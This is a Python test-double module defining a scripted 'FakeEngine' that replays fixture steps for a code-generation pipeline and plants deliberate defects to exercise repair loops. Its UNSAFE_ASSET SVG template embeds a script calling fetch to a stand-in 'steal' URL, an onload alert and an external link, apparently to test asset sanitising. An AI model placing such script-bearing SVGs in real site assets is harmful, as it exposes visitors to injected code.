import asyncio
import json
import shutil
import time
from datetime import UTC, datetime
from pathlib import Path

from pydantic import BaseModel

from .port import (
    EngineContext,
    EngineErrorReason,
    EngineEvent,
    EngineEventKind,
    EngineHealth,
    EngineRequest,
    EngineResult,
    EngineStatus,
    EngineUsage,
    ICodeEngine,
    ModelCall,
    OnEngineEvent,
    ToolCall,
)
from .workspace import changed_files, ensure_inside, install_skills, snapshot, write_managed_section


class FakeStep(BaseModel):
    """One scripted engine call: files to write/copy/delete, an optional delay, and the outcome to report."""

    write: dict[str, str] = {}
    copy_from: Path | None = None
    # Frontend lane: copy the golden frontend matching `.bga/frontend-spec.json` (project name), optionally with
    # one planted conventions defect (a hard-coded colour in the shell) so the repair loop runs.
    golden_frontend: bool = False
    plant_frontend_defect: bool = False
    # Custom components (Story 17.3): write the component `.bga/component.json` asks for, from `GOLDEN_COMPONENTS`
    # (a plain generic component for any other name), optionally with the planted colour defect.
    custom_component: bool = False
    plant_component_defect: bool = False
    # Spec drafts (Stories 2.4, 12.4): write the example spec(s) matching the requirement in `.bga/` (DRAFT_FIXTURES).
    draft_fixture: bool = False
    # Site images (Story 15.2): draw the SVGs `.bga/assets.json` asks for, from `GOLDEN_ASSETS` (a simple generic
    # drawing for any other id); `unsafe_assets` plants a script, an external link and a hex colour in each (15.3).
    golden_assets: bool = False
    unsafe_assets: bool = False
    delete: list[str] = []
    sleep_s: float = 0
    crash: bool = False
    status: EngineStatus = EngineStatus.OK
    error_reason: EngineErrorReason | None = None
    message: str = "Done."


class SimulatedCrash(BaseException):
    """Escapes normal error handling, like a worker dying mid-step (for recovery tests)."""


GOLDEN = Path(__file__).resolve().parent / "golden" / "two_entity"
GOLDEN_SHOP = GOLDEN.parent / "shop"
_TASK_ROUTER = "src/modules/tasks/presenter/router.py"
_CONTACT_ROUTER = "src/modules/contact_messages/presenter/router.py"
# TESTING / DEMO ONLY (docs/development/test-doubles.md). Golden frontends: hand-written, convention-correct
# implementations of these FrontendSpec examples only; any other FrontendSpec fails the fake frontend lane.
GOLDEN_FRONTENDS = {
    "Corner Shop": GOLDEN.parent / "frontend" / "corner_shop",  # examples/frontend-specs/shop-dynamic.json
}
FRONTEND_SHELL = "src/components/layout/SiteShell.tsx"
PLANTED_COLOR = "text-[#b91c1c] "
# TESTING / DEMO ONLY: hand-written custom components of examples/frontend-specs/shop-dynamic.json, by name.
GOLDEN_COMPONENTS = GOLDEN.parent / "frontend" / "custom_components"
GENERIC_COMPONENT = """"use client";

import type { ReactNode } from "react";

type {name}Props = {{
  title?: string;
  children?: ReactNode;
}};

export default function {name}({{ title, children }}: {name}Props) {{
  return (
    <div className="flex flex-col gap-4 rounded-lg border border-border p-4">
      {{title && <h2 className="text-lg font-semibold">{{title}}</h2>}}
      {{children}}
    </div>
  );
}}
"""


# TESTING / DEMO ONLY: hand-drawn SVGs for the generated assets of the examples (static-landing, project-tracker).
GOLDEN_ASSETS = GOLDEN.parent / "assets"
GENERIC_ASSET = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="{view_box}">
  <rect width="100%" height="100%" fill="var(--muted)" />
  <circle cx="30%" cy="45%" r="18%" fill="var(--primary)" opacity="0.85" />
  <rect x="48%" y="30%" width="34%" height="40%" rx="4%" fill="var(--accent)" />
</svg>
"""
UNSAFE_ASSET = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  viewBox="{view_box}">
  <script>fetch("https://example.com/steal")</script>
  <rect width="100%" height="100%" fill="#ff00ff" onload="alert(1)" />
  <use xlink:href="https://example.com/sprite.svg#icon" />
</svg>
"""


def write_assets(workdir: Path, unsafe: bool) -> list[str]:
    """The SVGs the orchestrator asked for in `.bga/assets.json` (frontend_assets.py)."""
    request = json.loads((workdir / ".bga" / "assets.json").read_text())
    written = []
    for asset in request["assets"]:
        golden = GOLDEN_ASSETS / f"{asset['id']}.svg"
        if unsafe:
            text = UNSAFE_ASSET.format(view_box=asset["viewBox"])
        else:
            text = golden.read_text() if golden.is_file() else GENERIC_ASSET.format(view_box=asset["viewBox"])
        target = ensure_inside(workdir / asset["file"], workdir)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
        written.append(asset["file"])
    return written


def write_custom_component(workdir: Path, defect: bool) -> str:
    """The component the orchestrator asked for in `.bga/component.json` (custom_components.py)."""
    request = json.loads((workdir / ".bga" / "component.json").read_text())
    golden = GOLDEN_COMPONENTS / f"{request['name']}.tsx"
    code = golden.read_text() if golden.is_file() else GENERIC_COMPONENT.format(name=request["name"])
    if defect:
        code = code.replace('className="', f'className="{PLANTED_COLOR}', 1)
    target = ensure_inside(workdir / request["file"], workdir)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(code)
    return request["file"]


# TESTING / DEMO ONLY (docs/development/test-doubles.md). Draft fixtures: the example specs (EXAMPLES_DIR) a
# requirement mentioning the keyword drafts to, per mode; `examples/requirements/*.md` match one each.
DRAFT_FIXTURES = [
    (
        "corner shop",
        {"backend": ["specs/shop.json"], "dynamic": ["frontend-specs/shop-dynamic.json", "specs/shop.json"]},
    ),
    ("northwind", {"static": ["frontend-specs/static-landing.json"]}),
]
DRAFT_DEFAULTS = {
    "backend": ["specs/two-entity.json"],
    "static": ["frontend-specs/static-landing.json"],
    "dynamic": ["frontend-specs/project-tracker-dynamic.json", "specs/two-entity.json"],
}


def write_draft_fixture(workdir: Path) -> list[str]:
    """The draft the orchestrator asked for in `.bga/draft.json` (orchestrator/drafting.py), from the examples."""
    from src.configs import config

    inputs = workdir / ".bga"
    request = json.loads((inputs / "draft.json").read_text())
    mode = request["mode"]
    if request["source"] == "frontend":
        shutil.copyfile(inputs / "base-spec.json", workdir / "backend-spec.json")
        written, picked = ["backend-spec.json"], "the imported site"
    else:
        text = next((p.read_text() for p in (inputs / "requirement.md", inputs / "requirement.txt") if p.is_file()), "")
        files = next(
            (by_mode[mode] for keyword, by_mode in DRAFT_FIXTURES if keyword in text.lower() and mode in by_mode),
            DRAFT_DEFAULTS[mode],
        )
        written = []
        for name in files:
            target = "frontend-spec.json" if name.startswith("frontend-specs/") else "backend-spec.json"
            shutil.copyfile(Path(config.examples_dir) / name, workdir / target)
            written.append(target)
        picked = ", ".join(files)
    spec = "backend" if mode == "backend" else "frontend"
    notes = {
        "assumptions": [{"spec": spec, "path": "", "message": f"Fake engine: drafted from {picked}"}],
        "unresolved": []
        if mode == "static"
        else [{"spec": "backend", "path": "/operations", "message": "Who may change or delete records is not stated"}],
    }
    (workdir / "notes.json").write_text(json.dumps(notes, indent=2) + "\n")
    return [*written, "notes.json"]


def _project_name(spec_path: Path) -> str | None:
    if not spec_path.is_file():
        return None
    import json

    return (json.loads(spec_path.read_text()).get("project") or {}).get("name")


def golden_frontend_for(workdir: Path) -> Path | None:
    return GOLDEN_FRONTENDS.get(_project_name(workdir / ".bga" / "frontend-spec.json"))


def shop_demo_scenario(delay_s: float = 0.3) -> dict[str, list[FakeStep]]:
    """Replays a recorded, convention-correct implementation of `examples/specs/shop.json` (`golden/shop`,
    one step per planned module) with one deliberate defect in the contact_messages router so the repair loop runs."""
    fixed_router = (GOLDEN_SHOP / "contact_messages" / _CONTACT_ROUTER).read_text()
    return {
        "generate_database": [FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "database")],
        "generate_backend": [
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "categories"),
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "products"),
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "cart_items"),
            FakeStep(
                sleep_s=delay_s,
                copy_from=GOLDEN_SHOP / "contact_messages",
                write={_CONTACT_ROUTER: fixed_router + "\n\ndef broken(:\n"},
            ),
        ],
        "generate_tests": [
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "tests_categories"),
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "tests_products"),
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "tests_cart_items"),
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN_SHOP / "tests_contact_messages"),
        ],
        "repair_code": [
            FakeStep(
                sleep_s=delay_s,
                write={_CONTACT_ROUTER: fixed_router},
                message="Fixed the syntax error in the contact_messages router.",
            )
        ],
    }


def demo_scenario(delay_s: float = 0.3) -> dict[str, list[FakeStep]]:
    """Replays a recorded, convention-correct implementation of `examples/specs/two-entity.json`
    (`golden/two_entity`, one step per planned module; or `golden/shop` when `.bga/spec.json` is `Corner Shop`)
    with one deliberate defect: the last module router is written with a syntax error, so validation fails once
    and the repair loop runs. Any other spec fails validation."""
    fixed_router = (GOLDEN / "tasks" / _TASK_ROUTER).read_text()
    return {
        "generate_database": [FakeStep(sleep_s=delay_s, copy_from=GOLDEN / "database")],
        "generate_backend": [
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN / "projects"),
            FakeStep(
                sleep_s=delay_s,
                copy_from=GOLDEN / "tasks",
                write={_TASK_ROUTER: fixed_router + "\n\ndef broken(:\n"},
            ),
        ],
        "generate_tests": [
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN / "tests_projects"),
            FakeStep(sleep_s=delay_s, copy_from=GOLDEN / "tests_tasks"),
        ],
        "repair_code": [
            FakeStep(
                sleep_s=delay_s,
                write={_TASK_ROUTER: fixed_router},
                message="Fixed the syntax error in the tasks router.",
            )
        ],
        # A rendered site's custom components (Story 17.3), one call each.
        "generate_custom_component": [FakeStep(sleep_s=delay_s, custom_component=True)],
        "repair_custom_component": [FakeStep(sleep_s=delay_s, custom_component=True)],
        # First call (the shell) writes the whole golden frontend with one defect; the page calls change nothing.
        "generate_frontend": [
            FakeStep(sleep_s=delay_s, golden_frontend=True, plant_frontend_defect=True),
            FakeStep(sleep_s=delay_s, message="The page is already in place."),
        ],
        "repair_frontend": [
            FakeStep(sleep_s=delay_s, golden_frontend=True, message="Replaced the hard-coded colour with a token."),
        ],
        # Site images (Story 15.2): the golden drawings, one call for all of a job's generated assets.
        "generate_assets": [FakeStep(sleep_s=delay_s, golden_assets=True, message="Drew the illustrations.")],
        # Spec drafts (Stories 2.4, 12.4): the example spec(s) the requirement matches; nothing to repair.
        "draft_spec": [FakeStep(sleep_s=delay_s, draft_fixture=True, message="Drafted the spec.")],
        "draft_frontend_spec": [FakeStep(sleep_s=delay_s, draft_fixture=True, message="Drafted the specs.")],
        "repair_spec": [FakeStep(sleep_s=delay_s, message="Nothing to repair.")],
        "*": [FakeStep(write={"FAKE_ENGINE.md": "Written by the fake engine.\n"})],
    }


DEMO_SCENARIO = demo_scenario()
DEFAULT_SCENARIO = DEMO_SCENARIO


def _is_demo_backend(scenario: dict[str, list[FakeStep]]) -> bool:
    db_steps = scenario.get("generate_database") or []
    return len(db_steps) == 1 and db_steps[0].copy_from == GOLDEN / "database"


class FakeEngine(ICodeEngine):
    """TESTING / DEMO ONLY (docs/development/test-doubles.md). Deterministic engine for tests and UI work:
    replays FakeSteps per purpose, never calls a model.

    Calls are counted per (workspace, purpose): the n-th call gets the n-th step and the last step repeats,
    so concurrent jobs never consume each other's script. Purpose "*" is the fallback.
    """

    name = "fake"

    def __init__(self, allowed_root: Path, scenario: dict[str, list[FakeStep]] | None = None):
        self.allowed_root = allowed_root
        self.scenario = {purpose: list(steps) for purpose, steps in (scenario or DEFAULT_SCENARIO).items()}
        self._shop_scenario: dict[str, list[FakeStep]] | None = None
        if _is_demo_backend(self.scenario):
            delay_s = self.scenario["generate_database"][0].sleep_s
            self._shop_scenario = shop_demo_scenario(delay_s=delay_s)
        self.calls: list[EngineRequest] = []
        self._counts: dict[tuple[str, str], int] = {}
        self._cancels: dict[str, asyncio.Event] = {}

    async def health(self) -> EngineHealth:
        return EngineHealth(name=self.name, available=True, reason="Scripted engine; no model calls")

    async def prepare_workspace(self, workdir: Path, context: EngineContext) -> None:
        install_skills(context.skill_dirs, workdir / ".claude" / "skills")
        write_managed_section(workdir / "CLAUDE.md", context.conventions)

    async def cancel(self, invocation_id: str) -> bool:
        # setdefault, not get: a cancel that lands just before run() registers the invocation must not be lost.
        self._cancels.setdefault(invocation_id, asyncio.Event()).set()
        return True

    def _next_step(self, workdir: Path, purpose: str) -> FakeStep:
        active = self.scenario
        if (
            self._shop_scenario is not None
            and purpose in self._shop_scenario
            and _project_name(workdir / ".bga" / "spec.json") == "Corner Shop"
        ):
            active = self._shop_scenario
        steps = active.get(purpose) or self.scenario.get("*") or [FakeStep()]
        key = (str(workdir), purpose)
        index = self._counts.get(key, 0)
        self._counts[key] = index + 1
        return steps[min(index, len(steps) - 1)]

    async def run(self, request: EngineRequest, on_event: OnEngineEvent | None = None) -> EngineResult:
        workdir = ensure_inside(request.workdir, self.allowed_root)
        ensure_inside(request.state_dir, self.allowed_root)
        self.calls.append(request)
        step = self._next_step(workdir, request.purpose)
        if step.crash:
            raise SimulatedCrash(f"simulated crash during {request.purpose}")
        started = time.monotonic()
        started_at = datetime.now(UTC)
        before = snapshot(workdir)
        tools: list[ToolCall] = []

        async def emit(kind: EngineEventKind, summary: str, **data) -> None:
            if on_event is not None:
                await on_event(EngineEvent(kind=kind, summary=summary, data=data))

        await emit(EngineEventKind.SYSTEM, "session started (fake)")
        cancel = self._cancels.setdefault(request.invocation_id, asyncio.Event())
        status, reason = step.status, step.error_reason
        try:
            if step.sleep_s:
                try:
                    await asyncio.wait_for(cancel.wait(), timeout=step.sleep_s)
                    status, reason = EngineStatus.CANCELLED, EngineErrorReason.CANCELLED
                except TimeoutError:
                    pass
            if status != EngineStatus.CANCELLED:
                source = golden_frontend_for(workdir) if step.golden_frontend else step.copy_from
                if source is not None:
                    shutil.copytree(source, workdir, dirs_exist_ok=True, ignore=shutil.ignore_patterns("__pycache__"))
                    await emit(EngineEventKind.TOOL_USE, f"Copy {source.name}", tool="Copy")
                    tools.append(ToolCall(name="Copy", target=source.name, started_at=datetime.now(UTC)))
                if source is not None and step.plant_frontend_defect:
                    shell = workdir / FRONTEND_SHELL
                    shell.write_text(shell.read_text().replace('className="', f'className="{PLANTED_COLOR}', 1))
                if step.draft_fixture:
                    for relative in write_draft_fixture(workdir):
                        await emit(EngineEventKind.TOOL_USE, f"Write {relative}", tool="Write", target=relative)
                        tools.append(ToolCall(name="Write", target=relative, started_at=datetime.now(UTC)))
                if step.golden_assets or step.unsafe_assets:
                    for relative in write_assets(workdir, step.unsafe_assets):
                        await emit(EngineEventKind.TOOL_USE, f"Write {relative}", tool="Write", target=relative)
                        tools.append(ToolCall(name="Write", target=relative, started_at=datetime.now(UTC)))
                if step.custom_component or step.plant_component_defect:
                    relative = write_custom_component(workdir, step.plant_component_defect)
                    await emit(EngineEventKind.TOOL_USE, f"Write {relative}", tool="Write", target=relative)
                    tools.append(ToolCall(name="Write", target=relative, started_at=datetime.now(UTC)))
                for relative, content in step.write.items():
                    target = ensure_inside(workdir / relative, workdir)
                    target.parent.mkdir(parents=True, exist_ok=True)
                    target.write_text(content)
                    await emit(EngineEventKind.TOOL_USE, f"Write {relative}", tool="Write", target=relative)
                    tools.append(ToolCall(name="Write", target=relative, started_at=datetime.now(UTC)))
                    await emit(EngineEventKind.TOOL_RESULT, "ok: written", isError=False)
                for relative in step.delete:
                    ensure_inside(workdir / relative, workdir).unlink(missing_ok=True)
                    await emit(EngineEventKind.TOOL_USE, f"Delete {relative}", tool="Delete", target=relative)
                    tools.append(ToolCall(name="Delete", target=relative, started_at=datetime.now(UTC)))
                await emit(EngineEventKind.MESSAGE, step.message)
        finally:
            self._cancels.pop(request.invocation_id, None)

        usage = EngineUsage(
            input_tokens=1000,
            output_tokens=200,
            cache_read_tokens=400,
            cost_usd=0.0,
            cost_source="reported",
            model="fake",
        )
        model_calls = _fake_calls(started_at, datetime.now(UTC), tools)
        await emit(EngineEventKind.USAGE, "1 turns, 200 output tokens", **usage.model_dump())
        return EngineResult(
            invocation_id=request.invocation_id,
            engine=self.name,
            purpose=request.purpose,
            status=status,
            error_reason=reason,
            error_message=None if status == EngineStatus.OK else f"fake {status}",
            exit_code=0 if status == EngineStatus.OK else 1,
            duration_ms=int((time.monotonic() - started) * 1000),
            turns=1,
            usage=usage,
            session_id=f"fake-{request.invocation_id}",
            final_message=step.message,
            changed_files=changed_files(before, snapshot(workdir)),
            argv_redacted=["fake"],
            prompt_ref=request.prompt_ref,
            model_calls=model_calls,
        )


def _fake_calls(started: datetime, ended: datetime, tools: list[ToolCall]) -> list[ModelCall]:
    """Two scripted model calls that add up to the reported usage: one issues the tools, one answers."""
    middle = started + (ended - started) / 2
    for tool in tools:
        tool.ended_at = tool.started_at
    common = {"model": "fake", "cost_usd": 0.0, "cost_source": "reported", "latency_source": "measured"}
    return [
        ModelCall(
            seq=1, input_tokens=600, output_tokens=150, started_at=started, ended_at=middle, tools=tools, **common
        ),
        ModelCall(
            seq=2,
            input_tokens=400,
            output_tokens=50,
            cache_read_tokens=400,
            started_at=middle,
            ended_at=ended,
            **common,
        ),
    ]
